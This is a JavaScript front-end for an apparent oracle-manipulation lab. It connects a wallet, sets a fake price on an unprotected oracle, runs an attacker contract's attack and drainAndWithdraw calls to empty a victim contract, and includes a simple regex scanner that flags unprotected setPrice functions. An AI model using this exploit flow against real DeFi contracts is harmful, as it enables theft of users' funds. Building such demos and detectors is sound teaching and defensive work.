// ====== CONFIG: FILL THESE AFTER DEPLOYING CONTRACTS ======

const VULNERABLE_ORACLE_ADDRESS = "0xf3b6173A93cEa7FbF15e81b2db86b281FeA3df12";
const VICTIM_CONTRACT_ADDRESS = "0x066A452554545cAa102c47f3A4ae4Ef8bfD8dF75";
const ATTACKER_CONTRACT_ADDRESS = "0xB3ee93AD28D7c57da506e8403d193C3F235869E0";


// ====== ABIs ======
const vulnerableOracleAbi = [
  "function setPrice(uint256 _price) public",
  "function getPrice() public view returns (uint256)",
];
const victimAbi = [
  "function buyTokens() public payable",
  "function sellTokens(uint256 tokenAmount) public",
  "function balances(address owner) public view returns (uint256)",
];
const attackerAbi = [
  "function attack(uint256 fakePrice) public payable",
  "function drainAndWithdraw() public",
  "function manipulatePrice(uint256 newPrice) public",
];

// ====== GLOBAL STATE ======
let provider, signer, currentAccount;

// ====== TABS & UI ======
function switchTab(tabName) {
  document.getElementById('attack-view').style.display = 'none';
  document.getElementById('scanner-view').style.display = 'none';

  if (tabName === 'attack') {
      document.getElementById('attack-view').style.display = 'grid';
  } else {
      document.getElementById('scanner-view').style.display = 'block';
  }

  document.querySelectorAll('.nav-btn').forEach(btn => {
      btn.classList.remove('active');
      if (btn.textContent.toLowerCase().includes(tabName)) {
          btn.classList.add('active');
      }
  });
}

function handleFileUpload(event) {
    const file = event.target.files[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = (e) => document.getElementById("codeInput").value = e.target.result;
    reader.readAsText(file);
}

// ====== BLOCKCHAIN ACTIONS ======
async function connectWallet() {
  if (!window.ethereum) return alert("MetaMask not detected.");

  provider = new ethers.BrowserProvider(window.ethereum);

  try {
    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    currentAccount = accounts[0];
    signer = await provider.getSigner();
    document.getElementById("connectBtn").textContent = currentAccount.slice(0,6) + "..." + currentAccount.slice(-4);
    await refreshAllViews();
  } catch (err) {
    console.error(err);
    alert("Connection failed.");
  }
}

function getContract(addr, abi, readOnly=false) {
  if(!provider) provider = new ethers.BrowserProvider(window.ethereum);
  return new ethers.Contract(addr, abi, readOnly ? provider : signer);
}

// --- READ FUNCTIONS ---
async function loadOraclePrice() {
  try {
    const c = getContract(VULNERABLE_ORACLE_ADDRESS, vulnerableOracleAbi, true);
    document.getElementById("oraclePrice").textContent = (await c.getPrice()).toString();
  } catch (e) { console.error(e); }
}

async function loadTokenBalance() {
  if (!currentAccount) return;
  try {
    const c = getContract(VICTIM_CONTRACT_ADDRESS, victimAbi, true);
    document.getElementById("tokenBalance").textContent = (await c.balances(currentAccount)).toString();
  } catch (e) { console.error(e); }
}

async function loadAttackerBalance() {
  try {
    const c = getContract(VICTIM_CONTRACT_ADDRESS, victimAbi, true);
    document.getElementById("attackerBalance").textContent = (await c.balances(ATTACKER_CONTRACT_ADDRESS)).toString();
  } catch (e) { console.error(e); }
}

async function loadVictimETHBalance() {
  try {
    if (!provider) provider = new ethers.BrowserProvider(window.ethereum);
    const balanceWei = await provider.getBalance(VICTIM_CONTRACT_ADDRESS);
    const balanceEth = ethers.formatEther(balanceWei);

    const box = document.getElementById("victimEthBalance");
    if (box) box.textContent = balanceEth + " ETH";
  } catch (error) {
    console.error("Failed to load victim ETH balance:", error);
  }
}

// --- WRITE FUNCTIONS ---
async function updateOraclePrice() {
  if (!signer) return alert("Please connect wallet first.");
  try {
    const c = getContract(VULNERABLE_ORACLE_ADDRESS, vulnerableOracleAbi);
    const tx = await c.setPrice(document.getElementById("fakePriceInput").value);
    await tx.wait();
    await refreshAllViews(); // Update price on screen
  } catch (e) {
    console.error(e);
    alert("Transaction failed. Check console for details.");
  }
}

async function buyTokens() {
  if (!signer) return alert("Please connect wallet first.");
  try {
    const c = getContract(VICTIM_CONTRACT_ADDRESS, victimAbi);
    const val = ethers.parseEther(document.getElementById("ethAmountInput").value);
    const tx = await c.buyTokens({ value: val });
    await tx.wait();

    // FIXED: Refresh everything so ETH balance updates immediately
    await refreshAllViews();
  } catch (e) {
    console.error(e);
    alert("Transaction failed. Check console for details.");
  }
}

async function runAttack() {
  if (!signer) return alert("Please connect wallet first.");
  try {
    const c = getContract(ATTACKER_CONTRACT_ADDRESS, attackerAbi);
    const price = document.getElementById("attackPriceInput").value;
    const val = ethers.parseEther(document.getElementById("attackEthInput").value);
    const tx = await c.attack(price, { value: val });
    await tx.wait();
    await refreshAllViews();
    alert("Attack Executed! Check Attacker Loot.");
  } catch (e) {
    console.error(e);
    alert("Attack failed. Check console.");
  }
}

async function cashOut() {
    if (!signer) return alert("Please connect wallet first.");
    try {
        const c = getContract(ATTACKER_CONTRACT_ADDRESS, attackerAbi);
        const tx = await c.drainAndWithdraw();
        await tx.wait();
        await refreshAllViews();
        alert("Funds drained to your wallet!");
    } catch(e) {
        console.error(e);
        alert("Cash out failed. Ensure you updated the contract code.");
    }
}

// ====== SCANNER LOGIC (TEXT ONLY) ======
function analyzeCode() {
  const code = document.getElementById("codeInput").value;
  const resultBox = document.getElementById("scanResult");
  const msgBox = document.getElementById("scanMessage");

  resultBox.style.display = "block";

  let findings = [];

  if (/function\s+setPrice\s*\([^)]*\)\s*public/.test(code) && !/onlyOwner|require\(\s*msg\.sender/.test(code)) {
    findings.push("[CRITICAL] 'setPrice' is public without access control. Anyone can manipulate the price.");
  }

  if (code.includes(".getPrice()") && !code.includes("AggregatorV3Interface")) {
    findings.push("[HIGH] Contract uses an insecure or custom oracle instead of Chainlink.");
  }

  if (code.includes("* price") || code.includes("* oracle.getPrice()")) {
    findings.push("[INFO] Price is used directly in multiplication. Verify decimals and overflow protection.");
  }

  if (findings.length > 0) {
    msgBox.innerHTML = findings.join("<br><br>");
    resultBox.style.borderColor = "#ef4444";
    msgBox.style.color = "#fca5a5";
  } else {
    msgBox.textContent = "No obvious oracle vulnerabilities found in this snippet.";
    resultBox.style.borderColor = "#22c55e";
    msgBox.style.color = "#4ade80";
  }
}

// FIXED: Added loadVictimETHBalance to the refresh loop
async function refreshAllViews() {
  await loadOraclePrice();
  await loadTokenBalance();
  await loadAttackerBalance();
  await loadVictimETHBalance();
}

// ====== INIT ======
window.addEventListener("DOMContentLoaded", () => {
  document.getElementById("connectBtn").addEventListener("click", connectWallet);
  document.getElementById("setPriceBtn").addEventListener("click", updateOraclePrice);
  document.getElementById("buyTokensBtn").addEventListener("click", buyTokens);
  document.getElementById("runAttackBtn").addEventListener("click", runAttack);
  document.getElementById("cashOutBtn").addEventListener("click", cashOut);

  document.getElementById("scanBtn").addEventListener("click", analyzeCode);
  document.getElementById("fileUpload").addEventListener("change", handleFileUpload);

  // NEW: Listen for wallet changes (Fixes the "switch account" issue)
  if (window.ethereum) {
    window.ethereum.on('accountsChanged', () => window.location.reload());
    window.ethereum.on('chainChanged', () => window.location.reload());
  }
});